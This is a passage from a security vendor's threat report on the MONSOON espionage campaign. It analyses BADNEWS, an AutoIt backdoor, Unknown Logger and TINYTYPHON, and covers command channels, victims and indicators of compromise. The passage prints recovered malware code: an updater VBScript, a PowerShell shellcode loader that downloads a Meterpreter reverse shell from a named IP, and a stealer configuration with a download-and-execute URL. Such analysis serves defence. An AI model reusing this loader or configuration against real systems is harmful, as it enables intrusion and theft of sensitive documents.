\nhxxp://www.webrss.com/createfeed.phpfeedid=4 7449 \nhxxp://www.chinasmack.com/2016/digest/chinese -tourist-bit-by-snake-in-thailand.html  \nhxxp://www.travelhoneymoon.wordpress.com/2016/03/30/tips -to-how-to-feel-happy \nhxxp://overthemontains.weebly.com/trekking -lovers \nhxxp://tariqj.crabdance.com/tesla/ghsnl s.php \nhxxp://javedtar.chickenkiller.com/tesla/ghsnls.php  \nhxxp://asatar.ignorelist.com/tesla/ghsnls.php  \nThe first 7 C&Cs  are referred  to by the malware  as either  a \"blog\"  or a \"feed\".  These  channels  are only \nused  to tell the malware  where  its real C&C  is. The last 3 Dynamic  DNS  channels  are back -up C&Cs  in \ncase  it is not able to obtain  a C&C  address  from one of the blogs  or feeds.  \nThe Dynamic DNS back -up C&Cs typically use the same “ghsnls.php”  filename but the directory name \nchanges for different builds of the malware. The directory may indicate a campaign identifier or a code -\nword for the target victim of the malware. We have seen the following directories used:  \n tesla  \n Tussmal  \n Mussmal  \n quantum  \n yumhong  \n  Forcepoint ™ Security Labs™   |  Special Investigation s \n \n \n MONSOON – ANALYSIS OF AN APT CA MPAIGN  Revision: 1 .07  |  TLP-WHITE   |  24/57 \n \nWhen  a C&C  is obtained  from a blog or feed,  it is extra cted from the page  by searching  for \"{{\" in the \ncontent.  A GitHub  example11 is below:  \n \nFigure 21 – GitHub Command Channel  \n \nAnother  example  taken  from a comment  by a user called  \"Zubaid12\" posted  on chinasmack [.com ]: \n \nFigure 22 – Chinasmack[.com]  Command Channel  \n  \n                                                \n11 https://github .com/azeemkhan89/  \n12 https://en.wikipedia.org/wiki/Zubaid  \nForcepoint ™ Security Labs™   |  Special Investigation s \n \n \n MONSOON – ANALYSIS OF AN APT CA MPAIGN  Revision: 1 .07  |  TLP-WHITE   |  25/57 \n \nAnd a final example  taken  from forum.china.org.cn:  \n \nFigure 23 – Forum Command Channel  \n \nThe content  after \"{{\" is the C&C  address  which  is encrypted  in the same  manner  as described  below.   Of \nnote is that this text  on the forum page is invisible , as the author has set it to white text on a white \nbackground.  \n  \nForcepoint ™ Security Labs™   |  Special Investigation s \n \n \n MONSOON – ANALYSIS OF AN APT CA MPAIGN  Revision: 1 .07  |  TLP-WHITE   |  26/57 \n \nC&C Mechanism . Once  BADNEWS  has decided  which  C&C  address  to communicate  with it will send  off \nsome  system  informat ion and await  a command  to execute.  A unique  identifier  is computed  for the victim  \nwhich  is based  on the tick count  from the victim machine  when  the malware  was executed.  This ID is saved  \nin the file \"%temp% \\T89.dat \". \nPOST http://85.25.79.230/tesla/ghsnls. php HTTP/1.1  \nAccept: application/x -www-form-urlencoded  \nContent-Type: application/x -www-form-urlencoded  \nUser-Agent: UserAgent:Mozilla/5.0(Windows  NT 6.1;WOW64)AppleWebKit/537.1(KHTML,like  \nGecko)Chrome/21.0.1180.75Safari/537.1  \nHost: 85.25.79.230  \nContent-Length: 249 \nCache-Control:  no-cache \n  \nesmqss=**redacted**&btcbumegy=**redacted**&pxckhj=**redacted**&xyvqq=**redacted**  \n  Forcepoint ™ Security Labs™   |  Special Investigation s \n \n \n MONSOON – ANALYSIS OF AN APT CA MPAIGN  Revision: 1 .07  |  TLP-WHITE   |  27/57 \n \nThe encryption  mechanism  used  for all C&C  data is done  by taking  each  byte and performing  a ROR  by 3 \nbits and then an XOR  by 0x23.  The result of this is then converted  into a hexadecimal  representation  of the \nbytes,  and finally  encoded  into base64.  \nBelow  is a Python  script  written to decrypt  the data: \nbadnews_decoder.py   \nimport sys, getopt \nimport base64 \n  \n# Rotate left: 0b1001 --> 0b0011 \nrol = lambda val, r_bits, max_bits:  \\ \n    (val << r_bits%max_bits)  & (2**max_bits -1) | \\ \n    ((val & (2**max_bits -1)) >> (max_bits -(r_bits%max_bits)))  \n  \n# Rotate right: 0b1001 --> 0b1100 \nror = lambda val, r_bits, max_bits:  \\ \n    ((val & (2**max_bits -1)) >> r_bits%max_bits)  | \\ \n    (val << (max_bits -(r_bits%max_bits))  & (2**max_bits -1)) \n  \n  \nif len(sys.argv)  != 2: \n  exit(\"Usage:  badnews_dec oder.py <string>\")  \n  \ndata = sys.argv[1]  \n  \n# Print original  data input \nprint \"[1] Original:     \" + data \n  \ndata = base64.b64de code(data)  \n  \n# Print the base64 decoded hex byte string \nprint \"[2] Base64 dec:  \" + data \n  \n# Decode the hex bytes into to binary data \ndata = data.decode(\"hex\")  \n  \ndecdata = '' \n  \n# XOR each byte by 0x23 and rotate left by 3 bits \nfor x in range(len(data)):  \n  c = ord(data[x])  \n  c ^= 0x23 \n  c = rol(c, 3, 8) \n  decdata += chr(c) \n  \n# Null terminate  \ndecdata += '\\x00' \n  \n# Print the final decrypted  data \nprint \"[3] Decrypted:    \" + decdata \n \nAn example  of the input  and output  for this script : \n>badnews_decoder.py  \nMmVhZGFkMmQ2NGM2YzY4NWU2NjU4NWE1ZTYwNDI0ZTZlNTI0YzY4ZWFkNmMyZGVlNGZ jZGM2Y2YwZmFkOGZlNjJkMmUyZDIz==  \n[1] Original:     \nMmVhZGFkMmQ2NGM2YzY4NWU2NjU4NWE1ZTYwNDI0ZTZlNTI0YzY4ZWFkNmMyZGVlNGZjZGM2Y2YwZmFkOGZlNjJkMmUyZDIz==  \n[2] Base64 dec:  2eadad2d64c6c685e66585a5e60424e 6e524c68ead6c2dee4fcdc6cf0fad8fe62d2e2d23  \n[3] Decrypted:    http://5.254.98.68/mtzpncw/gate.php  Forcepoint ™ Security Labs™   |  Special Investigation s \n \n \n MONSOON – ANALYSIS OF AN APT CA MPAIGN  Revision: 1 .07  |  TLP-WHITE   |  28/57 \n \nCommand  Set.  After  BADNEWS  sends  off the system  information  of the machine  it will receive  back  a \ncommand.  Most  commands  are in the format  of \"<cmd>:<encryped -parameter> \" where  \"<cmd> \" is a \nplaintext  command  tag and \"<encrypted -parameter> \" is a parameter  for the command  encrypted  with the \nalgorithm  previously  described.  \nListed below are supported  command  tags and their descriptions:  \nCMD  Description  \nshell Downloa d an EXE and inject  it into a new process  using  process  hollowing  \nlink Download  an EXE and execute  it via CreateProcess  API \nmod Download  a DLL from the URL specified  and load it into the current  process  \nupd Download  a new version  of the malware  and delete the old one via VBScript  (see below)  \ndwd Create  an empty  file in the %temp%  folder  and send  to C&C  - possibly  used  for identifying  the \nlocal system  time \nkl Send  keylog  file to C&C  (keylogging  is always  on) \nsnp Take  a screenshot  and send  it to the C&C  \nustr Exfiltrate  documents  found  on the machine  - the malware  asynchronously  crawls  local hard-\ndrives  for documents  (pdf, doc etc.) \nsdwl Upload  specified  file from victim  machine  \nutop Disable  document  exfiltration  \nhcmd  Execute  command  via cmd.exe  and send the output  to C&C  \n{{ Use new C&C  server  address  specified  between  {{ and }} in the content  (i.e. \n{{MmVhZGFkMmQ2NGM2YzZjZGNkY2RlNjZmYWUwZjJlZTY0ZmNlOGVjNjZmYWUwZ\njJlZTY4ZjJjOGYyMw==}} ) \nok Do nothing  \n \nFigure 24 – BADNEWS Comman d Set  \nThe malware  will send  back  an acknowledgment  response  for most  of these  commands  along  with any \nadditional  data from the command  that has been  executed.  \n  Forcepoint ™ Security Labs™   |  Special Investigation s \n \n \n MONSOON – ANALYSIS OF AN APT CA MPAIGN  Revision: 1 .07  |  TLP-WHITE   |  29/57 \n \nKeylogger .  When  BADNEWS  first starts  it will spawn  a new thread  to log keystrokes  to a file. The header  \nof the file contains  the marker  \"KLTNM: \" and the system  language.  The rest of the file contains  information  \nabout  the active  window  and the keys pressed:  \nKLTNM:    崐ခခ00000409 \n2016/06/01  09:42:18  - {Window Name } \n[SHIFT]c[SHIFT];  \nThe malware  will only send  the keylog  file to the C&C  when  instructed  to by the \"kl\" command.  \nDocument  Crawler .  When  BADNEWS  first starts  it will spawn  a new thread  to check  all local & mapped  \ndrives  for document  files with the following  extensions:  \n doc \n docx  \n pdf \n ppt \n pptx \n txt \nAny documents  under  15MB  will be copied  to the user's  %temp% \\SMB \\ folder.  The malware  will only send  \nthese  documents  to the C&C  when  instructed  to by the \"ustr\" command.  \nWindow Message Processor . BADNEWS  will also check  for any new hard-drives  that are added  to the \nmachine  such  as USB devices.  It does  this in an interesting  way by creating  a window  and listening  for the \nWM_DEVICECHANGE  window  message:  \nLRESULT CALLBACK WndProc(HWND hWnd, UINT Msg, WPARAM wParam, LPARAM lParam)  \n{ \n  // Window message 23 is defined by the malware as a code to disable the document crawler  \n  \n  if ( Msg > WM_QUERYENDSESSION )  \n  { \n    if ( Msg == WM_ENDSESSION )  \n      return 23;  \n  \n    // Has a new device been added to the machine? If so, try to find documents  \n    if ( Msg == WM_DEVICECHANGE )  \n      CrawlDrivesForDo cuments();  \n  } \n  else \n  { \n    switch ( Msg )  \n    { \n      case WM_QUERYENDSESSION:  \n        return 23;  \n      case WM_CREATE:  \n        return 0;  \n      case WM_DESTROY:  \n        return 23;  \n    } \n  } \n  return DefWindowProcW(hWnd, Msg, wParam, lParam);  \n} \nFigure 25 - Device Change Listener  Forcepoint ™ Security Labs™   |  Special Investigation s \n \n \n MONSOON – ANALYSIS OF AN APT CA MPAIGN  Revision: 1 .07  |  TLP-WHITE   |  30/57 \n \n Updater VBScript .  The \"upd\" command  downloads  a new version  of the malware  to %temp% \\up.exe  \nand then updates  the malware  (jli.dll ) via the following  VBScript:  \nAUTOIT  BACKDOOR  \nThe majority  of the weaponised  documents  used  in MONSOON  are PPS files which  exploit  CVE-2014 -\n6352  and drop an AutoIt  binary.  The AutoIt  script  contained  within  the binary  contains a host of feature s \nincluding:  \n Sending  off system  information  \n Executing  arbitrary  commands  \n Updating  itself \n Escalating  privileges  (bypassing  UAC  [7]) \n Exfiltrating  documents  found  on the system  \n Executing  secondary  PowerShell -based  malware  \n Executing  second  stage  \"custom\"  malware  \n Stealing  Chrome  passwords  \n Identifying  whether  360 Total  Security  anti-virus  is running  \n  Set oShe ll = CreateObject (\"WScript.Shell\")  \nDim strArgs,dest,file ,demofile,filesys,appdata,wshSystemEnv  \ndest=\"MicroScMgmt.exe       \"  \ndest1=\"jli.dll\"  \nWScript.sleep 8000  \nstrArgs = \"cmd /c move /Y %temp% \\up.exe \"\"%appdata%\"\" \\Microsoft \\\"+dest1 \noShell.Run strArgs, 0 , true \nSet filesys = CreateObject (\"Scripting.FileSystemObject\")  \nwshSystemEnv = oShell.ExpandEnvironmentStrings( \"%APPDATA%\" )  \nappdata = wshSystemEnv & \" \\ss.vbs\" \nset demofile = filesys.GetFile(appdata)  \ndemofile.Delete  \nstrArgs= \"cmd /c \"\"\"+ wshSystemEnv +\" \\Microsoft \\\"+dest+\"\"\"\"  \noShell.Run strArgs, 0, false  \nFigure 26 – Updater VBScript  Forcepoint ™ Security Labs™   |  Special Investigation s \n \n \n MONSOON – ANALYSIS OF AN APT CA MPAIGN  Revision: 1 .07  |  TLP-WHITE   |  31/57 \n \nDecompiled  AutoIt Script . A fully decompiled  version  of this AutoIt  backdoor  was generated by the \nSpecial Investi gations Team in Forcepoint Security Labs™.  \nDocument  Exfiltration .  The AutoIt  backdoor  is capable  of finding  and uploading  documents  with the \nfollowing  extensions:  \n*.doc;*.pdf;*.csv;*.ppt;*.docx;*.pst;*.xls;*.xlsx;*.pptx;*.jpeg  \nThese  will then be uploaded  to /update -request.php  on the C&C.  \n \nFigure 27 – Upload via PHP Script  \n \nPrivilege  Escalation . The backdoor  will attempt  to escalate  privileges  by bypassing  Windows  User  \nAccount  Control  (UAC)  using  one of two well-known  techniques13: \nIf the user's  operating  system  is 64-bit then the malware  will use the Windows  Update  Standalone  Installer  \n(WUSA)  to copy  its DLL into a protected folder ( C:\\Windows \\System32 \\oobe ) with the name  \nwdscore.dll . It will then execute  oobe.exe  which  will side-load the malicious  wdscore.dll  instead  of the \none from the system  directory.   \nIf the user is on a 32-bit system  then the malware  will use the CallWindowProcW  API to jump  into some  \nshellcode  that will inject  the UAC  bypass  executable  into Svchost.exe . Firstly, the legitimate  Windows  \n\"Computer  Management.lnk \" file is overwritten  with a new version  using  Leo Davidson's  IFileOperation14 \ncode.  This links to the original  malware  executable.  Secondly,  the malware  will execute  \nCompMgmtLauncher.exe  which  in turn will execute  the copied  shortcut  as an elevated  process.  \n  \n                                                \n13 https://www.pretent iousname.com/misc/win7_uac_whitelist2.html  \n14 https://msdn.microsoft.com/en -us/library/bb775771(VS.85).aspx  \nForcepoint ™ Security Labs™   |  Special Investigation s \n \n \n MONSOON – ANALYSIS OF AN APT CA MPAIGN  Revision: 1 .07  |  TLP-WHITE   |  32/57 \n \nPowerShell  Second  Stage  & Metasploit  Meterpreter . The AutoIt backdoor will send heartbeats to its \nC&C at /dropper.php  and receive back commands. During our analysis, we saw that the C&C \n212[.]129[.]1 3[.]110  was serving a base64 encoded resp onse to the heartbeat requests:  \n \nFigure 28 – Base64 Response  \nThis response  contains  the command  ID and the parameter.  In this case  the command  ID is 2 which  tells \nthe AutoIt  backdoor  to execute the base64  encoded  blob under  PowerShell.  \n  \nForcepoint ™ Security Labs™   |  Special Investigation s \n \n \n MONSOON – ANALYSIS OF AN APT CA MPAIGN  Revision: 1 .07  |  TLP-WHITE   |  33/57 \n \nThe PowerShell script eventually decodes to  a typical shell code loader , which  has been  cleaned  up and \nbeautified:  \nThe shellcode  will dynamically  resolve  APIs  and attempt  to download  a malware  component  from \nhxxps://45[.]43[.]192[.]172:8443/OxGN.  $c = '' \n[DllImport(\"kernel32.dll\")]  \npublic static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint \nflAllocationType, uint flProtect);  \n[DllImport(\"kernel32.dll\")]  \npublic static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, \nIntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);  \n[DllImport(\"msvcrt.dll\")]  \npublic static extern IntPtr mems et(IntPtr dest, uint src, uint count);  \n  \n$w = Add -Type -memberDefinition $c -Name \"Win32\" -namespace Win32Functions -passthru;  \n  \n[Byte[]]  \n$sc = \n0xfc,0xe8,0x8 6,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0\nx8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31...**snip**...  \n  \n$size = 0x1000;  \n  \nif ($sc.Length -gt 0x1000){  \n  $size = $sc.Length  \n}; \n  \n$x=$w::VirtualAlloc(0,0x10 00,$size,0x40);  \n  \nfor ($i=0;$i -le ($sc.Length -1);$i++) {  \n  $w::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)  \n}; \n  \n$w::CreateThread(0,0,$x,0,0,0);  \n  \nfor (;;){  \n  Start-sleep 60  \n}; \nFigure 29 – Beautified Powershell  Forcepoint ™ Security Labs™   |  Special Investigation s \n \n \n MONSOON – ANALYSIS OF AN APT CA MPAIGN  Revision: 1 .07  |  TLP-WHITE   |  34/57 \n \n \nFigure 30 – Hard Coded IP Address  \n  \nForcepoint ™ Security Labs™   |  Special Investigation s \n \n \n MONSOON – ANALYSIS OF AN APT CA MPAIGN  Revision: 1 .07  |  TLP-WHITE   |  35/57 \n \nThe payload  received  from this was yet more  shellcode  and what  appeared  to be encrypted  binary  data.  \nThis secondary  shellcode  changed  each  time request ed it from the C&C  because  it was being  dynamically  \nbuilt with a different  encryption  (XOR)  key: \n \nFigure 31 – Encrypted Shellcode  \n  \nForcepoint ™ Security Labs™   |  Special Investigation s \n \n \n MONSOON – ANALYSIS OF AN APT CA MPAIGN  Revision: 1 .07  |  TLP-WHITE   |  36/57 \n \nOnce  decrypted,  the data appears  to be a PE file but contains  code  within  the header.  \n \nFigure 32 – Decrypted PE File  \nIt finally calls code  to manually  load and relocate  the decrypted  executable  into a new region  of memory,  \nand then jump  into the original  entry  point.  It turned  out that the decrypted  executable  here was actuall y \nMetasploit's  Meterpreter,  which  spawned  a reverse  TCP shell back  to the C&C  at \nhxxps://45[.]43[.]192[.]172:8443 . During  our analysis  the following  commands  from the Meterpreter  \nserver  were received : \n stdapi_sys_config_getuid  \n stdapi_sys_config_sysinfo  \n stdapi_net_config_get_interfaces  \n stdapi_net_config_get_routes  \nForcepoint ™ Security Labs™   |  Special Investigation s \n \n \n MONSOON – ANALYSIS OF AN APT CA MPAIGN  Revision: 1 .07  |  TLP-WHITE   |  37/57 \n \nNo further commands were receive  any after this. \nUNKNOWN  LOGGER  PUBLIC  V 1.5 \nUnknown  Logger  is another  \nmalware  component  used  in \nMONSOON.  It is a publicly  \nreleased,  free backdoor . It is  \ncapable of  credential  theft from \nbrowsers,  keylogging,  taking  \nscreenshots,  spreading  itself \nlaterally,  and downloading  \nsecond  stage  malware.  \nIn 2012,  a user named  \"The  \nUnknown\"  publicly  released  a \nfree version  of a credential  \nstealing  worm  on \nhackforums[. net] called  \n\"Unknown  Logger  Public\" . \nThe actors  have  been  using  \nversion  1.5 of this malware  in \nsome  of their weaponised  \ndocuments.  It is likely  that they \nsimply  downloaded  and built \ntheir own version  from the \npublicly  available  version  1.5 \non Hackforums.  \n \n \n \n \n \n \n \nUnkn own Logger is dropped by at least two15 of the weaponised documents analysed. Both of these  \ndocuments exploit CVE -2014 -6352 . \n                                                \n15 SHA1: 824013c9d8b2aab1396c4a50579f8bd4bf80abdb  \n    SHA1: e27d3cfc9141f618c5a8c075e7d18af11a012710  \nFigure 33 – Unknown Logger Server Configuration  Panel  Forcepoint ™ Security Labs™   |  Special Investigation s \n \n \n MONSOON – ANALYSIS OF AN APT CA MPAIGN  Revision: 1 .07  |  TLP-WHITE   |  38/57 \n \n \nFigure 34 – Unknown Logger – Settings Panel  \n  \nForcepoint ™ Security Labs™   |  Special Investigation s \n \n \n MONSOON – ANALYSIS OF AN APT CA MPAIGN  Revision: 1 .07  |  TLP-WHITE   |  39/57 \n \nUnknown  Logger's  main  purpose  is to record  keystrokes  and steal usernames  and passwords  saved  by \nbrowsers  on the local machine.  This information  is then sent to a pre-defined  FTP or SMTP  server  with a \nusername  and password  specified  by the actor  when  building  the malware.  It can also spread  itself into \nRAR  files, USB devices  and network  shares. Interestingly it does not have the ability for C&C \ncommunication. It cannot execute arbitrary commands or receive a command in dicating what it should do \nnext.\nFeatures : \n1- Built in Stub  \n2- Get Tons of Information about the s lave \n(Computer User, Computer Name, Computer Total \nPhysical Memory, slave's IP Address, slave's \nCountry, Date, etc...)  \n3- Send logs to SMTP Severs and FTP  \n4- SMTP (Hotmail, Gmail, AOL, Yahoo)  \n5- Test Mail Functionality (Hotmail, Gmail, AOL, \nYahoo) \n6- Test FTP Functionality  \n7- Continuously Send Logs without Fail  \n8- Custom Logs Sending Interval (Which means you \nChoose when the Logs are sent to you)  \n9- Logs Every Single Thing on the Keyboard \n(Letters(Up Cases and Low Cases) - Numbers - \nSymbols - Specific Keys ([F1], [F2], [Home], \netc...))  \n10- Works on all Operating Systems (Window XP, \nWindow Vista, Window 7 (32 and 64 bit)  \n11- Hide Functionality (Make the Server Invisible \nto the Naked eye)  \n12- Never Crashes in slave's Computer (Will \nalways be working whatever h appens) \n13- Simple and Easy to use GUI  \n14- Customer Server Name  \n15- Sends Clean and Very Organized Logs  \n16- Can be Used as a Keylogger - Stealer - Worm - \nSpreader and more by just Checking Few Boxes  \n \nSpreaders : \n1- USB Spreader  \n2- LAN Spreader  \n3- P2P Spread er \n4- RAR Spreader  \n \nStealers : \n1- Firefox 4/5/6/7/8/9  \n2- Google Chrome All Versions  \n3- Opera All Versions  \n4- Internet Explorer 7/9  5- Steam Stealer  \n6- CD Keys (up to 300)  \n \nAnti Killers : \n1- Anti Nod32 (All Versions)  \n2- Anti Kaspersky (All Versions)  \n3- Anti BitDefender (All Versions)  \n4- Anti MalwareBytes (All Versions)  \n5- Anti Norman (All Versions)  \n6- Anti WireShark (All Versions)  \n7- Anti Anubis (All Versions)  \n8- Anti KeyScrambler (All Versions)  \n9- Anti Ollydbg (All Versions)  \n10- Anti Outpost (All Versions)  \n11- Anti ZoneAlaram (All Versions)  \n \nDisablers : \n1- Disable RUN  \n2- Disable Registry  \n3- Disable CMD  \n4- Disable Right Click  \n5- Disable Task Manager  \n6- Disable System Restore  \n \nDeleters : \n1- Delete FireFox Cookies  \n2- Delete Google Chrome Cookies  \n3- Delete Internet Explorer Cookies  \n \nDownload And Execute : \nAdd any Link that Leads to any kind of File and \nthis File will be Downloaded and Execute \nAutomatically and Anonymously  \n \nWebpage Loader : \nAdd any Link and it will be Automatically Loaded \non the slave's PCForcepoint ™ Security Labs™   |  Special Investigation s \n \n \n MONSOON – ANALYSIS OF AN APT CA MPAIGN  Revision: 1 .07  |  TLP-WHITE   |  40/57 \n \nConfiguratio n.  In the samples analysed16, \nUnknown  Logger  was configured  to download  \nthe AutoIt  backdoor  upon  start-up. One of \nconfigurations  was as follows:  \nSetting  Value  \nUsername  chinastratforum @gma\nil.com  \nPassword  **redacted**  \nSmtpServer  smtp.gmail.com  \nFTPServer  ftp://www.example.co\nm/example.txt  \nSmtpPort  587 \nUseSmtp  True \nUseFTP  False  \nExfilIntervalMinutes  1 \nScreenshotEmailRecipient  c**redacted** @gmail.\ncom \nUSBSpreader  True \nCreateNetworkShare  True \nRARSpreader  True \nP2PSpreader  True \nFirefoxStealer  True \nOper aStealer  False  \nChromeStealer  True \nIEStealer  False  \nSteamStealer  False  \nCDKeysStealer  False  \nDeleteCookies  False  \nDeleteChromeCookies  False  \n                                                \n16  SHA1: c691c07191963ca3db28235d0a38060b2b9ea8f2  \n      SHA1: 6e85333e5ee05c40bee0457419aa68a007a0e5f5  Setting  Value  \nDeleteFirefoxSignons  False  \nRunRegistryKey  False  \nScreenshots  True \nScreenshotIntervalMinutes  1 \nFakeAlert  False  \nFakeAlertText    \nAlertType    \nAntiKeyScrambler  True \nAntiWireshark  True \nAntiAnubis  True \nAntiMalwarebytes  True \nAntiKaspersky  True \nAntiOllydbg  True \nAntiOutpost  True \nAntiNorman  True \nAntiBitdefender  True \nAntiNOD32  True \nAntiZoneAlarm  True \nKeylogger  True \nNoRun  False  \nNoRegedit  False  \nNoCMD  False  \nNoViewContextMenu  False  \nNoTaskMgr  False  \nNoSystemRestore  False  \nLaunchProcess  False  Forcepoint ™ Security Labs™   |  Special Investigation s \n \n \n MONSOON – ANALYSIS OF AN APT CA MPAIGN  Revision: 1 .07  |  TLP-WHITE   |  41/57 \n \nSetting  Value  \nLaunchProcessString  http://  \nDownloadExecFile  True Setting  Value  \nDownloadExecFileURL  http://newsnstat.com/\nnregsrv2.exe  \nMelt False  \nFigure 35 – Unknown Logger Configuration\nThe settings have been named as part of the investigation as they are not specifically  named  in the \nmalware.  The \"DownloadExecFileURL \" specifies  a URL to grab an additional  file from and \nexecute  it at runtime.  Analysis  found  that nregsrv2 .exe is the same  AutoIt  trojan  dropped  by many  \nof the other  weaponised  documents  used  in this campaign.  \nTINYTYPHON  \nThe TINYTYPHON  malware  is a small  backdoor  capable  of finding  and uploading  documents on \nlocally mapped drives and receiving secondary malware . It is dropped  by at least  one of the \nweaponised  documents17 used  in the MONSOON  campaign  where  it is embedded  inside  another  \nexecutable.  The majority  of the code  for TINYTYPHON  is taken  from the MyDoom  worm  and has \nbeen  repurposed  to find and exfiltrate  documents.  \nConfiguration & Persistence .  TINYTYPHON  contains  a small  configuration  appended  to the end \nof the executable.  In the sample  analysed18 this configuration  was XORed  with the hexadecimal  \nvalue  0x90.  \n                                                \n17 SHA1 : \n9cdbb41f8 3854ea4827c83ad9809ed0210566fbc  18 SHA1: \nfcf8e5cf1 207fdfab9bcb0a4dc45ad188089655a  Forcepoint ™ Security Labs™   |  Special Investigation s \n \n \n MONSOON – ANALYSIS OF AN APT CA MPAIGN  Revision: 1 .07  |  TLP-WHITE   |  42/57 \n \n \nFigure 36 – XOR 0x90 Data  \nThe configuration  contains  the C&C  address  and paths  to use as well as a list of document  \nextensions  to check  when  crawling  local drives.  It also contains  the filename  to copy  itself to in the \nlocal system32  directory,  and the name  of the persistence  registry  key to install  itself under  \nHKEY_LOCAL_MACHINE \\Software \\Microsoft \\Windows \\CurrentVersion \\Run. \nDocument Crawler .  TINYTYPHON  constantly  searches  for and uploads  documents  on the local \nmachine.  It will first search  for any documents  on the drive  containing  the operating  system,  and \nthen it will search  through  all drive  letters  C through  to Z. \nForcepoint ™ Security Labs™   |  Special Investigation s \n \n \n MONSOON – ANALYSIS OF AN APT CA MPAIGN  Revision: 1 .07  |  TLP-WHITE   |  43/57 \n \n \nFigure 37 – Document Crawler  \n  \nForcepoint ™ Security Labs™   |  Special Investigation s \n \n \n MONSOON – ANALYSIS OF AN APT CA MPAIGN  Revision: 1 .07  |  TLP-WHITE   |  44/57 \n \nOnce  a document  is found  matching  one of the extensions  in the configuration,  the document  is \nuploaded  to the C&C.  \n \nFigure 38 – Document Upload to C&C  \n \nVictims .  The TINYTYPHON  C&C  from the sample  we analysed  contained  a /http directory  which  \nhad an open  directory  listing:  \n \nFigure 39 – C&C Web Server /http listing  \n  \nForcepoint ™ Security Labs™   |  Special Investigation s \n \n \n MONSOON – ANALYSIS OF AN APT CA MPAIGN  Revision: 1 .07  |  TLP-WHITE   |  45/57 \n \nThe /upload  directory  contain ed several  folders  relating  to different  victims:  \n \nFigure 40 – C&C Web Server /http/upload listing  \nForcepoint ™ Security Labs™   |  Special Investigation s \n \n \n MONSOON – ANALYSIS OF AN APT CA MPAIGN  Revision: 1 .07  |  TLP-WHITE   |  46/57 \n \nEach  of these  folders  contain ed the documents  found  and uploaded  by TINYTYPHON  on the \nvictim's  machine.  \n \nFigure 41 – C&C Web Server /http/upload/<victim> listing  \n \nThe filenames  begin  with the MD5  hash  of the file, then a dash,  and then the original  filename.  \nThere  were  thous ands  of documents  which  had been  exfiltrated  to this C&C.  \nAfter  reviewing  the filenames  of documents  from several  of the victims,  it appears  as though  most  of \nthe victims  are involved  with government  agencies . Some  of these  documents  contain  highly  \nsensiti ve information  such  as clearance  documents,  financial  information,  and technical  \nspecifications.  \nDuring  the investigation,  the server  stopped  responding  on June  8, 2016  and then came  back  online  \non July 5, 2016.  It is unknown  why this month  long outage  occurred,  although  it could  have  been  \nbecause  the group  knew  that people  were  accessing  the open  directories  and wanted  to remain  \nundetected . \nForcepoint ™ Security Labs™   |  Special Investigation s \n \n \n MONSOON – ANALYSIS OF AN APT CA MPAIGN  Revision: 1 .07  |  TLP-WHITE   |  47/57 \n \nATTRIBUTION  \nWith respect to attribution, Forcepoint Security Labs focus on enabling the awareness and \nunderstanding o f intent.  This is useful in order to identify likely future behaviour.  Reports from \nSpecial Investigations do not focus on specific attribution.  \nVICTIMS  \nThe MONSOON victims fit with a group who have military and political interests  in the Indian \nSubcont inent . Many of the victims are located in surrounding countries including Bangladesh, Sri \nLanka and Pakistan. But victims also originate from further afield, including Africa and the Far East.  \nThe targeting of Chinese nationals may also be related to this  campaign , but equally may be part of \na separate campaign by the adversary or even as part of them selling Surveillance -As-A-Service in \na similar manner previously seen with the HANGOVER group  [2]. \nADVERSARIES  \nIt was possible to i dentify an individual from a domain registration record who  is believed to be \nassociated with MONSOON. There is a highly probable  level of confidence in this association due to \nthe following reasons:  \n The domain name registered is a variant of one of the mo st popular domains used in \nMONSOON  \n The person who registered the domain lives or has lived and works in India  \n The person who registered the domain has profiles on coding challenge and freelance coder \nwebsites. The HANGOVER group are thought to use freelanc e coders.  \nFrom the information available, it was possible to identify this individual’s Facebook and LinkedIn \naccounts. However, it is not deemed in the public interest to publish specific details on this \nindividual.  Relevant authorities are informed as an d when appropriate.  \nCui Bono?  A useful analysis viewpoint is to ask the legal question: Cui Bono ?  Or: “who profits? ” \nEven though this report does not attempt to focus on specific attribution, asking “What is to be \ngained from these actions  or what needs a re satisfied?”  may offers some insight.  Any further \nanalysis is left as an exercise to for reader.  \nFrom the documents  known to have been exfiltrated , a number of recurring themes  occur : \n Army training, personnel and payroll  \nrecords  \n Defence attaches  and co nsulates  \n Defence research  \n Foreign high commissions  \n Military exercises  \n Military air platforms  \n Military naval platforms  \n Military logistic records  \n Naval coastal protection   Anti-torpedo and naval electronic \ncountermeasure (ECM) systems.  \n Submarine communication  systems  \n Nuclear security and counter \nproliferation  \n United Nations  \n Personal details including medical \nrecords, d riving license, passport and \nvisas  \n Accounting records  \n Travel and itinerary detailsForcepoint ™ Security Labs™   |  Special Investigation s \n \n \n MONSOON – ANALYSIS OF AN APT CA MPAIGN  Revision: 1 .07  |  TLP-WHITE   |  48/57 \n \n \nINFRASTRUCTURE  \nBy integrating the findings with prior resear ch [1] [8], it was possible to connect  MONSOON  directly  \nwith infrastructure  used  by the HANGOVER group  via a series  of strong  connections.  The original  \nHANGOVER infrastructure  overlaps  with unique  passive  DNS  records  and is further  linked  by the \nuse of a specific  SOA  RNAME  record.  \nAn example  of this connection  is illustrated below.  \n \nFigure 42 – Connection Topology  \n \nBoth of the IPs that link this infrastructure  appear  to be unique to the Hangover  group.  The \nnewsnstat[. com] domain  was used  earlier  in 2015  for previous  HANGOVER  campaigns,  and was \nthen repurposed  in December  2015  for the MONSOON  campaign.  \nForcepoint ™ Security Labs™   |  Special Investigation s \n \n \n MONSOON – ANALYSIS OF AN APT CA MPAIGN  Revision: 1 .07  |  TLP-WHITE   |  49/57 \n \nINDICATORS  OF COMPROMISE  \nA list of IOCs  for MONSOON  can be found  below.  This not a comprehensive  list and is focused  on \nthe specific  documents  and malware  that were  analysed  for the purpose  of this report . \nLURE  URLS  \nhxxp://t.ymlp50.com/bjyapaejesjaoawsqaaaujwes/click.php  \nhxxp://www.newsnstat.com  \nhxxp://www.cnmilit.com  \nhxxp://www.m ilitaryworkerscn.com  \nhxxp://milresearchcn.com  \nhxxp://miltechweb.com  \nhxxp://milscience -cn.com \nhxxp://miltechcn.com  